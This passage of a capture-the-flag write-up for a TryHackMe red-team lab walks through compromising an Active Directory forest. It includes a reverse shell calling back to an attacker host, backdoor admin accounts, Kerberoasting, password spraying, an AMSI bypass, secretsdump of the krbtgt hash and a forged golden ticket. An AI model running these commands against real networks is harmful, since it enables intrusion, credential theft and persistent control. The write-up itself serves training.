+distinguishedname      : CN=Help Desk,OU=Groups,DC=corp,DC=thereserve,DC=loc
+name                   : Help Desk
+member                 : {CN=Mohammad Ahmed,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Keith Allen,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Ashley Chan,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Emily Harvey,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc...}
+whencreated            : 2/18/2023 6:34:27 PM
+instancetype           : 4
+objectguid             : ef6d9255-1df6-480e-86f6-ae870f3e490b
+objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
+```
+
+### Privilege Escalation
+
+"Backup Service" in the root directory of `C:` has an executable file called `backup.exe`.
+
+```powershell
+PS C:> ls
+```
+
+```
+Mode                LastWriteTime         Length Name
+-----                -------------         ------ ----
+d-----        7/12/2024  12:30 PM                Backup Service
+d-----       11/14/2018   6:56 AM                EFI
+d-----        5/13/2020   5:58 PM                PerfLogs
+d-r---        3/18/2023  10:45 AM                Program Files
+d-----        3/18/2023  10:44 AM                Program Files (x86)
+d-----        2/19/2023   5:06 PM                Python311
+d-r---        7/12/2024  12:45 PM                Users
+d-----        4/15/2023   7:56 PM                Windows
+-a----        4/15/2023   6:25 PM        3162859 EC2-Windows-Launch.zip
+-a----        4/15/2023   6:25 PM          13182 install.ps1
+-a----        4/27/2023   8:00 AM            848 thm-network-setup.ps1
+```
+
+```powershell
+PS C:> cd '.\Backup Service'
+PS C:\Backup Service> ls
+```
+
+```
+Directory: C:\Backup Service
+
+Mode                LastWriteTime         Length Name
+-----                -------------         ------ ----
+d-----        2/14/2023   7:34 PM                Full Backup
+```
+
+```powershell
+PS C:\Backup Service> cd '.\Full Backup'
+PS C:\Backup Service\Full Backup> ls
+```
+
+```
+Directory: C:\Backup Service\Full Backup
+
+Mode                LastWriteTime         Length Name
+-----                -------------         ------ ----
+-a----        2/14/2023   7:34 PM              0 backup.exe
+```
+
+**Scheduled Task**
+
+```powershell
+PS C:\Backup Service\Full Backup> get-scheduledtask -taskname 'backup'
+```
+
+```
+TaskPath                                       TaskName                          State
+---------                                       --------                          -----
+\Microsoft\Windows\Registry\                   RegIdleBackup                     Ready
+```
+
+**Service**
+
+```powershell
+PS C:\Backup Service\Full Backup> Get-Service -ServiceName 'backup'
+```
+
+```
+Status   Name               DisplayName
+------   ----               -----------
+Stopped  Backup             backup
+```
+
+
+```powershell
+PS C:\Backup Service\Full Backup> Get-WmiObject win32_Service | Select-Object Name, State, Startmode, description, PathName, DisplayName, startname | Select-String -Pattern 'backup'
+```
+
+```
+@{Name=Backup; State=Stopped; Startmode=Manual; description=; PathName=C:\Backup Service\Full Backup\backup.exe; DisplayName=Backup; startname=LocalSystem}
+```
+
+This service is being executed with Local System permission, and it is vulnerable to unquoted service paths. Priv Esc
+
+Priv Esc - https://github.com/izenynn/c-reverse-shell
+
+```bash
+$ ./change_client.sh 12.100.1.x 9009
+```
+
+```bash
+$ i686-w64-mingw32-gcc-win32 -std=c99 windows.c -o rsh.exe -lws2_32
+$ cp rsh.exe ~/THM/N-RedTeamCC/Capstone_Challenge_Resources/Tools
+```
+
+```powershell
+PS C:> cd '.\Backup Service'
+PS C:\Backup Service> ls
+PS C:\Backup Service> cp \tsclient\share\rsh.exe Full.exe
+PS C:\Backup Service> net start backup
+```
+
+```bash
+$ rlwrap nc -nvlp 9009
+listening on [any] 9009 ...
+connect to [12.100.1.x] from (UNKNOWN) [10.200.x.21] 63432
+Microsoft Windows [Version 10.0.17763.4252]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+
+WRK1
+```
+
+We are now having local admin privileges on the WRK1 machine.
+
+### Maintain Access
+
+Add new user
+
+```cmd
+C:\Windows\system32>net user neha 'hacker123' /add
+net user neha 'hacker123' /add
+The command completed successfully.
+
+C:\Windows\system32>net localgroup Administrators neha /add
+net localgroup Administrators neha /add
+The command completed successfully.
+
+C:\Windows\system32>net localgroup "Remote Desktop Users" neha /add
+net localgroup "Remote Desktop Users" neha /add
+The command completed successfully.
+```
+
+Get Flag
+
+## Corporate Division Tier 1 Infrastructure
+
+### Enumeration
+
+#### From WRK1 Machine
+
+```powershell
+PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcOctober
+```
+
+```
+logoncount             : 14
+badpasswordtime        : 1/1/1601 12:00:00 AM
+distinguishedname      : CN=svcOctober,OU=Services,DC=corp,DC=thereserve,DC=loc
+objectclass            : {top, person, organizationalPerson, user}
+displayname            : svcOctober
+lastlogontimestamp     : 3/24/2023 8:54:16 PM
+userprincipalname      : svcOctober@corp.thereserve.loc
+name                   : svcOctober
+objectsid              : S-1-5-21-170228521-1485475711-3199862024-1987
+samaccountname         : svcOctober
+codepage               : 0
+samaccounttype         : USER_OBJECT
+accountexpires         : NEVER
+countrycode            : 0
+whenchanged            : 3/24/2023 8:54:16 PM
+instancetype           : 4
+usncreated             : 341698
+objectguid             : 11e69fd6-46e7-414b-9c42-3fa7dafe9275
+lastlogoff             : 1/1/1601 12:00:00 AM
+objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
+dscorepropagationdata  : {3/20/2023 5:01:14 PM, 2/15/2023 9:07:45 AM, 1/1/1601 12:00:01 AM}
+serviceprincipalname   : mssql/svcOctober
+givenname              : svcOctober
+memberof               : CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc
+lastlogon              : 3/30/2023 10:26:54 PM
+badpwdcount            : 0
+cn                     : svcOctober
+useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+whencreated            : 2/15/2023 9:07:45 AM
+primarygroupid         : 513
+pwdlastset             : 2/15/2023 9:07:45 AM
+usnchanged             : 527762
+```
+
+Usually in any TryHackMe AD room, if there are any service accounts, these accounts will be Kerberoastable and their passwords can be cracked. Let's follow our intuition and see.
+
+### Kerberoasting
+
+#### Locally
+
+Using the PowerShell script, `Invoke-Kerberoast` from the Empire project, which can be loaded directly into memory (`ik.ps1` == `Invoke-Kerberoast.ps1`):
+
+```powershell
+PS C:\Users\mohammad.ahmed> Import-Module \tsclient\share\ik.ps1
+PS C:\Users\mohammad.ahmed> Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+PS C:\Users\mohammad.ahmed> dir
+```
+
+```
+Directory: C:\Users\mohammad.ahmed
+
+Mode                LastWriteTime         Length Name
+-----                -------------         ------ ----
+d-r---        5/21/2024   2:13 PM                3D Objects
+d-r---        5/21/2024   2:13 PM                Contacts
+d-r---        5/21/2024   2:13 PM                Desktop
+d-r---        5/21/2024   2:13 PM                Documents
+d-r---        5/21/2024   2:13 PM                Downloads
+d-r---        5/21/2024   2:13 PM                Favorites
+d-r---        5/21/2024   2:13 PM                Links
+d-r---        5/21/2024   2:13 PM                Music
+d-r---        5/21/2024   2:13 PM                Pictures
+d-r---        5/21/2024   2:13 PM                Saved Games
+d-r---        5/21/2024   2:13 PM                Searches
+d-r---        5/21/2024   2:13 PM                Videos
+-a----        5/22/2024   3:00 PM          12915 hashes.kerberoast
+```
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC/Hashes]
+└─$ hashcat -m 13100 svcScanning.hash --wordlist ../Capstone_Challenge_Resources/generated_passwords2.txt --show
+```
+
+```
+$krb5tgs$23$*svcScanning$corp.thereserve.loc$cifs/scvScanning*$<hash omitted for length>:Password1!
+```
+
+**Password Spraying**
+
+```bash
+$ crackmapexec smb 10.200.x.21 -u All_users.txt -p valid_passwords --continue-on-success
+```
+
+```
+SMB         10.200.x.21   445    WRK1             [+] corp.thereserve.loc\svcScanning!
+```
+
+### BloodHound
+
+ let's gather more info about AD using bloodhound
+
+```powershell
+PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcScanning
+```
+
+```
+logoncount             : 1
+badpasswordtime        : 5/22/2024 3:23:24 PM
+distinguishedname      : CN=svcScanning,OU=Services,DC=corp,DC=thereserve,DC=loc
+objectclass            : {top, person, organizationalPerson, user}
+displayname            : svcScanning
+lastlogontimestamp     : 5/22/2024 9:19:59 AM
+userprincipalname      : svcScanning@corp.thereserve.loc
+name                   : svcScanning
+objectsid              : S-1-5-21-170228521-1485475711-3199862024-1986
+samaccountname         : svcScanning
+codepage               : 0
+samaccounttype         : USER_OBJECT
+accountexpires         : NEVER
+countrycode            : 0
+whenchanged            : 5/22/2024 9:19:59 AM
+instancetype           : 4
+usncreated             : 341680
+objectguid             : baaf37c3-6507-4314-9ef9-a7012be29c74
+lastlogoff             : 1/1/1601 12:00:00 AM
+objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
+dscorepropagationdata  : {3/20/2023 5:01:14 PM, 2/15/2023 9:07:06 AM, 1/1/1601 12:00:01 AM}
+serviceprincipalname   : cifs/scvScanning
+givenname              : svcScanning
+memberof               : CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc
+lastlogon              : 5/22/2024 3:23:26 PM
+badpwdcount            : 0
+cn                     : svcScanning
+useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+whencreated            : 2/15/2023 9:07:06 AM
+primarygroupid         : 513
+pwdlastset             : 2/15/2023 9:07:06 AM
+usnchanged             : 1172549
+```
+
+```powershell
+PS C:\Users\mohammad.ahmed> Get-DomainGroup -userName 'svcScanning'
+```
+
+```
+usncreated             : 341777
+grouptype              : GLOBAL_SCOPE, SECURITY
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Services
+whenchanged            : 2/15/2023 9:42:50 AM
+objectsid              : S-1-5-21-170228521-1485475711-3199862024-1988
+objectclass            : {top, group}
+cn                     : Services
+usnchanged             : 342199
+dscorepropagationdata  : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
+name                   : Services
+distinguishedname      : CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc
+member                 : {CN=svcScanning,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcMonitor,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcEDR,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcBackups,OU=Services,DC=corp,DC=thereserve,DC=loc}
+whencreated            : 2/15/2023 9:09:35 AM
+instancetype           : 4
+objectguid             : c27deed9-dd22-4990-bd6f-54275906435f
+objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
+
+usncreated             : 12318
+grouptype              : GLOBAL_SCOPE, SECURITY
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Domain Users
+whenchanged            : 9/7/2022 8:58:08 PM
+objectsid              : S-1-5-21-170228521-1485475711-3199862024-513
+objectclass            : {top, group}
+cn                     : Domain Users
+usnchanged             : 12320
+dscorepropagationdata  : {3/20/2023 5:01:14 PM, 9/7/2022 8:58:09 PM, 1/1/1601 12:04:17 AM}
+memberof               : CN=Users,CN=Builtin,DC=corp,DC=thereserve,DC=loc
+iscriticalsystemobject : True
+description            : All domain users
+distinguishedname      : CN=Domain Users,CN=Users,DC=corp,DC=thereserve,DC=loc
+name                   : Domain Users
+whencreated            : 9/7/2022 8:58:08 PM
+instancetype           : 4
+objectguid             : 31be5ca3-8646-4475-a349-e009ef75cb92
+objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
+```
+
+#### AV Evasion
+
+Found an obfuscated version of SharpHound that worked with me in this repo: `GitHub - Flangvik/ObfuscatedSharpCollection`
+
+**AMSI Bypass**
+
+```powershell
+PS C:> $v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."GetField"('ams' + 'iInitFailed','NonPublic,Static')."SetValue"($null,$true)
+```
+
+**AppLocker Bypass**
+
+```powershell
+PS C:> cd C:\Windows\Tasks
+PS C:\Windows\Tasks> cp \tsclient\share\ss.exe .
+```
+
+**Running the obfuscated Script**
+
+```powershell
+PS C:\Windows\Tasks> ./ss.exe --CollectionMethods All
+```
+
+```
+2024-06-27T19:13:37.2636725+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-06-27T19:13:37.4635801+00:00|INFORMATION|Initializing SharpHound at 7:13 PM on 6/27/2024
+2024-06-27T19:13:37.8699076+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for corp.thereserve.loc : CORPDC.corp.thereserve.loc
+2024-06-27T19:13:38.0105192+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-06-27T19:13:38.4565794+00:00|INFORMATION|Beginning LDAP search for corp.thereserve.loc
+2024-06-27T19:13:39.2845578+00:00|INFORMATION|Producer has finished, closing LDAP channel
+2024-06-27T19:13:39.2845578+00:00|INFORMATION|LDAP channel closed, waiting for consumers
+2024-06-27T19:14:08.6588099+00:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 53 MB RAM
+2024-06-27T19:14:25.4557589+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for thereserve.loc : ROOTDC.thereserve.loc
+2024-06-27T19:14:25.4557589+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for thereserve.loc : ROOTDC.thereserve.loc
+2024-06-27T19:14:28.2861838+00:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2024-06-27T19:14:28.3814768+00:00|INFORMATION|Output channel closed, waiting for output task to complete
+2024-06-27T19:14:28.5361835+00:00|INFORMATION|Status: 1005 objects finished (+1005 20.1)/s -- Using 59 MB RAM
+2024-06-27T19:14:28.5361835+00:00|INFORMATION|Enumeration finished in 00:00:50.0935515
+2024-06-27T19:14:29.0711816+00:00|INFORMATION|Saving cache with stats: 970 ID to type mappings.
+976 name to SID mappings.
+2 machine sid mappings.
+5 sid to domain mappings.
+1 global catalog mappings.
+2024-06-27T19:14:29.1181271+00:00|INFORMATION|SharpHound Enumeration Completed at 7:14 PM on 6/27/2024! Happy Graphing!
+```
+
+As we have recently compromised the `svcScanning` user via a Kerberoasting attack, let's choose the option "Shortest Path From Kerberoastable Users."
+
+
+
+It seems that the `svcScanning` user is a member of `services@corp.thereserve.loc` and has the permission to execute remote PowerShell commands on the `server2.corp.thereserve.loc` computer.
+
+### Gaining Foothold
+
+#### From SERVER2 Machine
+
+**PowerShell Remote**
+
+As per BloodHound's output, let's  execute remote commands on the Server2 machine:
+
+```powershell
+PS C:\Users\mohammad.ahmed> $Secpass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
+PS C:\Users\mohammad.ahmed> $Cred = New-Object System.Management.Automation.PSCredential('corp.thereserve.loc\svcScanning', $Secpass)
+PS C:\Users\mohammad.ahmed> Invoke-Command -ComputerName server2.corp.thereserve.loc -Credential $Cred -ScriptBlock {whoami}
+corp\svcscanning
+PS C:\Users\mohammad.ahmed> Invoke-Command -ComputerName server2.corp.thereserve.loc -Credential $Cred -ScriptBlock {hostname}
+SERVER2
+```
+
+**Getting a fully interactive PowerShell session**
+
+```powershell
+PS C:\Users\mohammad.ahmed> Enter-PSSession -ComputerName server2.corp.thereserve.loc -Credential $Cred -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+[server2.corp.thereserve.loc]: PS C:\Users\svcScanning\Documents> powershell -nop -exec bypass
+```
+
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+```
+
+```powershell
+PS C:\Users\svcScanning\Documents>
+[server2.corp.thereserve.loc]: PS C:\Users\svcScanning\Documents> whoami;hostname
+corp\svcscanning
+SERVER2
+```
+
+Now we have access to a `server2.corp.thereserve.loc` computer. But unfortunately, we don't have direct access from our attacker machine to SERVER1 or SERVER2. So we need to establish port forwarding to ease the process of exploitation and privilege escalation.
+
+### Dynamic Port Forwarding
+
+As we have SSH enabled on WRK1 and WRK2 machines, let's create a secure tunnel via SSH using the dynamic port forwarding method.
+
+**On WRK1 Machine**
+
+```powershell
+PS C:\Users\mohammad.ahmed> ssh tunneluser@12.100.1.x -R 9050 -N
+```
+
+```
+The authenticity of host '12.100.1.x (12.100.1.x)' can't be established.
+ECDSA key fingerprint is SHA256+zTPNkk9edAkZVP6DZxa7hSuls.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '12.100.1.x' (ECDSA) to the list of known hosts.
+tunneluser@12.100.1.x's password:
+```
+
+**On kali Machine**
+
+```bash
+$ netstat -lno | head -n 10
+```
+
+```
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp6       0      0 ::1:9050                :::*                    LISTEN      off (0.00/0/0)
+```
+
+```bash
+$ proxychains -q evil-winrm -i 10.200.x.32 -u svcScanning -p 'Password1!'
+```
+
+```
+Evil-WinRM shell v3.4
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+Evil-WinRM PS C:\Users\svcScanning\Documents> hostname
+SERVER2
+```
+
+Get Flags
+
+## Full Compromise of CORP Domain
+
+### Exploiting GPO GenericWrite
+
+#### From SERVER2 Machine
+
+As `svcScanning` user has `GenericWrite` permission over the "DC Backups" group policy which is linked with the Domain Controllers group and the CORPDC machine, meaning if we were able to exploit it, we will get access to the DC machine. Let's first open MMC and add the group policy management snap-in, then choose the DC Backup Policy and edit.
+
+
+```powershell
+PS C:\Windows\Tasks> cp \tsclient\share\psexec64.exe .
+PS C:\Windows\Tasks> ls
+```
+
+```
+Directory: C:\Windows\Tasks
+
+Mode                LastWriteTime         Length Name
+-----                -------------         ------ ----
+-a----        4/11/2023   4:10 PM         833472 psexec64.exe
+```
+
+```powershell
+PS C:\Windows\Tasks> .\psexec64.exe -s -i cmd.exe
+```
+
+```
+PsExec v2.43 - Execute processes remotely
+Copyright (C) 2001-2023 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Windows\system32> whoami
+
+nt authority\system
+
+C:\Windows\system32> mmc
+```
+
+Editing the policy and adding our `svcScanning` user to the Domain Admins and Domain Controllers group via the Restricted Groups policy.
+
+Updating the GPO and checking our privileges.
+
+```powershell
+PS C:\Users\svcScanning> gpupdate.exe /force
+```
+
+```
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+```
+
+```powershell
+PS C:\Users\svcScanning> net user svcScanning /domain
+```
+
+```
+The request will be processed at a domain controller for domain corp.thereserve.loc.
+
+User name                    svcScanning
+Full Name                    svcScanning
+Comment
+Local Group Memberships
+Global Group memberships     *Domain Controllers   *Domain Users
+                              *Services             *Domain Admins
+The command completed successfully.
+```
+
+we can RDP to the DC machine, and we are now Domain Admins and OWN the whole Domain. We get the flags.
+
+## Full Compromise
+
+### Enumeration
+
+#### From CORPDC Machine
+
+Now we are part of the Domain Admins group and we own a child domain inside the whole forest. So let's enumerate some information about the forest and the domain trust.
+
+- **Forest:** `thereserve.loc`
+- **ChildDomain1:** `bank.thereserve.loc`
+- **ChildDomain2:** `corp.thereserve.loc` — **OWNED**
+
+```powershell
+Evil-WinRM PS C:\Windows\Tasks> Get-ADForest
+```
+
+```
+ApplicationPartitions : {DC=ForestDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=corp,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=bank,DC=thereserve,DC=loc}
+CrossForestReferences : {}
+DomainNamingMaster    : ROOTDC.thereserve.loc
+Domains               : {bank.thereserve.loc, corp.thereserve.loc, thereserve.loc}
+ForestMode            : Windows2012R2Forest
+GlobalCatalogs         : {ROOTDC.thereserve.loc, BANKDC.bank.thereserve.loc, CORPDC.corp.thereserve.loc}
+Name                   : thereserve.loc
+PartitionsContainer    : CN=Partitions,CN=Configuration,DC=thereserve,DC=loc
+RootDomain              : thereserve.loc
+SchemaMaster            : ROOTDC.thereserve.loc
+Sites                   : {Default-First-Site-Name}
+SPNSuffixes             : {}
+UPNSuffixes             : {}
+```
+
+**Using PowerView**
+
+```powershell
+Evil-WinRM PS C:\Windows\Tasks> Get-NetDomainTrust -Domain corp.thereserve.loc
+```
+
+```
+SourceName           TargetName       TrustType     TrustDirection
+----------           ----------       ---------     --------------
+corp.thereserve.loc  thereserve.loc   ParentChild   Bidirectional
+```
+
+```powershell
+Evil-WinRM PS C:\Windows\Tasks> Get-NetDomainTrust -Domain bank.thereserve.loc
+```
+
+```
+SourceName           TargetName       TrustType     TrustDirection
+----------           ----------       ---------     --------------
+bank.thereserve.loc  thereserve.loc   ParentChild   Bidirectional
+```
+
+> **Parent Child Trust:** When new child domains are added, a two-way transitive trust is automatically established by Active Directory between the child domain and its parent.
+>
+> **Transitive Trust:** A two-way relationship is automatically created between parent and child domains in a Microsoft Active Directory forest. When a new domain is created, it shares resources with its parent domain by default, enabling an authenticated user to access resources in both the child and parent domains.
+>
+> **Bidirectional:** Users of both domains can access resources in the other domain.
+
+
+As the CORP child trusts the ROOT domain and the BANK domain also trusts the ROOT domain, then both the CORP and BANK domains will trust each other as the trust type is transitive. Therefore, if we compromise a child domain, we can access the other child domain.
+
+### Exploiting Transitive Trust
+
+A Golden Ticket attack is a way of creating a forged TGT with a stolen KDC key, which enables us to gain access to any service on the domain, essentially becoming our own Ticket Granting Server (TGS). In order to perform a Golden Ticket attack, we will need the following information:
+
+- The Fully Qualified Domain Name (FQDN) of the Domain
+- The Security Identifier (SID) of the Domain
+- The username of the account that we want to impersonate
+- The KRBTGT password hash
+
+This allows us to forge Golden Tickets and access any resource in the CORP domain. However, we need to be able to forge an Inter-Realm TGT in order to become Enterprise Admins (EA) and access any resource in the ROOT domain. We need to exploit the trust between the parent domain and the child domain by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket, allowing us to have administrative privileges over the entire forest. So, we also need the following information in order to craft our Golden Ticket:
+
+- The SID of the child Domain Controller (CORPDC)
+- The SID of the Enterprise Admins (EA) from the parent domain (ROOTDC)
+
+**Getting KRBTGT Hash**
+
+```bash
+$ proxychains -q impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@10.200.x.102
+```
+
+```
+Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
+```
+
+**Getting CORP domain SID**
+
+```powershell
+PS C:\Windows\Tasks> Get-DomainSid
+```
+
+```
+S-1-5-21-170228521-1485475711-3199862024
+```
+
+**Getting Enterprise Admins Group SID for ROOTDC domain**
+
+```powershell
+PS C:\Windows\Tasks> Get-ADGroup -Identity 'Enterprise Admins' -Server ROOTDC.thereserve.loc
+```
+
+```
+DistinguishedName : CN=Enterprise Admins,CN=Users,DC=thereserve,DC=loc
+GroupCategory     : Security
+GroupScope        : Universal
+Name              : Enterprise Admins
+ObjectClass       : group
+ObjectGUID        : 6e883913-d0cb-478e-a1fd-f24d3d0e7d45
+SamAccountName    : Enterprise Admins
+SID               : S-1-5-21-1255581842-1300659601-3764024703-519
+```
+
+**Creating the Golden Ticket**
+
+```
+mimikatz : privilege::debug
+Privilege '20' OK
+mimikatz : kerberos::golden /user /domain.thereserve.loc /sid /service /rc4:0c757a3445acb94a654554f3ac529ede /sids /ptt
+User      : Administrator
+Domain    : corp.thereserve.loc (CORP)
+SID       : S-1-5-21-170228521-1485475711-3199862024
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-1255581842-1300659601-3764024703-519 ;
+ServiceKey: 0c757a3445acb94a654554f3ac529ede - rc4_hmac_nt
+Service   : krbtgt
+Lifetime  : 7/14/2024 4:18:13 PM ; 7/12/2034 4:18:13 PM ; 7/12/2034 4:18:13 PM
+-> Ticket : ** Pass The Ticket **
+
+PAC generated
+PAC signed
+EncTicketPart generated
+EncTicketPart encrypted
+KrbCred generated
+
+Golden ticket for 'Administrator @ corp.thereserve.loc' successfully submitted for current session
+```
+
+```cmd
+C:\Windows\system32>dir \\rootdc.thereserve.loc\c$
+```
+
+```
+ Volume in drive \\rootdc.thereserve.loc\c$ has no label.
+ Volume Serial Number is AE32-1DF2
+
+Directory of \\rootdc.thereserve.loc\c$
+
+04/01/2023  04:10 AM               427 adusers_list.csv
+03/17/2023  07:18 AM                85 dns_entries.csv
+04/15/2023  08:52 PM         3,162,859 EC2-Windows-Launch.zip
+11/14/2018  07:56 AM    <DIR>          EFI
+04/15/2023  08:52 PM            13,182 install.ps1
+05/13/2020  06:58 PM    <DIR>          PerfLogs
+09/07/2022  04:58 PM    <DIR>          Program Files
+09/07/2022  04:57 PM    <DIR>          Program Files (x86)
+04/15/2023  08:51 PM             1,812 thm-network-setup-dc.ps1
+07/14/2024  03:43 AM    <DIR>          Users
+09/07/2022  07:39 PM    <DIR>          Windows
+               5 File(s)      3,178,365 bytes
+               6 Dir(s)  22,418,341,888 bytes free
+```
+
+### Lateral Movement
+
+As our golden ticket is loaded into memory, and we have access to the ROOTDC machine, we need to perform lateral movement and establish a shell on this machine. A simple way would be by running psexec remotely on the ROOTDC machine.
+
+```powershell
+PS C:\Users\svcScanning\Desktop> .\psexec.exe \\ROOTDC.thereverse.loc cmd.exe
+```
+
+```powershell
+PS C:\Users\svcScanning\Desktop> winrs -r:rootdc.thereserve.loc cmd.exe
+```
+
+```
+Microsoft Windows [Version 10.0.17763.3287]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.CORP>whoami
+whoami
+
+corp\administrator
+
+C:\Users\Administrator.CORP>hostname
+hostname
+
+ROOTDC
+```
+
+now we have administrative access on the RootDC machine "the parent domain". We get the flags.
+
+## Full Compromise of BANK Domain
+
+### Persistence
+
+#### From ROOTDC Machine
+
+Great, we have a fully interactive shell, let's create our own user and add it to the enterprise admin group.
+
+```cmd
+C:\Users\Administrator.CORP>net user neha "Password1!" /domain
+The command completed successfully
+
+C:\Users\Administrator.CORP>net group "Enterprise Admins" neha /add /domain
+The command completed successfully.
+```
+
+**Connecting from Attacking Machine**
+
+```bash
+┌──(root㉿kali)-[~]
+└─$ proxychains -q evil-winrm -i 10.200.x.100 -u neha -p 'Password1!'
+```
+
+```
+Evil-WinRM shell v3.4
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+Evil-WinRM PS C:\Users\neha\Documents> hostname
+ROOTDC
+```
+
+### Port Forwarding
+
+We are now having access to the ROOTDC therefore, from here we can access the child domain `BANK.thereserve.loc`, but we can't access it directly from our own attacking machine. Therefore, we need to establish tunneling from the ROOTDC. We are assigned two interfaces, one for the TryHackMe VPN and the other for the Corp VPN, from that, we previously accessed the internal network.
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC/proxychains]
+└─$ ifconfig
+```
+
+```
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+inet 10.50.87.39  netmask 255.255.255.0  destination 10.50.87.39
+inet6 fe80::4eaf:39ba:b250  prefixlen 64  scopeid 0x20<link>
+unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+RX packets 1211  bytes 692035 (675.8 KiB)
+RX errors 0  dropped 0  overruns 0  frame 0
+TX packets 1078  bytes 473631 (462.5 KiB)
+TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+inet 12.100.1.x  netmask 255.255.255.0  destination 12.100.1.x
+inet6 fe80::90f7:43f8:282d  prefixlen 64  scopeid 0x20<link>
+unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+RX packets 1548  bytes 457422 (446.7 KiB)
+RX errors 0  dropped 0  overruns 0  frame 0
+TX packets 1405  bytes 263422 (257.2 KiB)
+TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+Let's check which IP is reachable from the ROOTDC.
+
+**Corp VPN**
+
+```powershell
+Evil-WinRM PS C:\Users\neha\Documents> ping 12.100.1.x
+```
+
+```
+Pinging 12.100.1.x with 32 bytes of data:
+Request timed out.
+```
+
+**TryHackMe VPN**
+
+```powershell
+Evil-WinRM PS C:\Users\neha\Documents> ping 10.50.87.39
+```
+
+```
+Pinging 10.50.87.39 with 32 bytes of data:
+Reply from 10.50.87.39: bytes=32 time=192ms TTL=63
+Reply from 10.50.87.39: bytes=32 time=94ms TTL=63
+```
+
+So the TryHackMe VPN is reachable there; let's establish dynamic port forwarding to access the BANKDC machine.
+
+```powershell
+Evil-WinRM PS C:\Users\neha\Documents> ssh tunneluser@10.50.87.39 -R 9060 -N
+```
+
+```
+tunneluser@10.50.87.39's password:
+```
+
+RDP 
+
+```bash
+┌──(root㉿kali)-[/]
+└─$ proxychains -q -f proxychains4.conf xfreerdp /u:neha /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.101
+```
+
+```
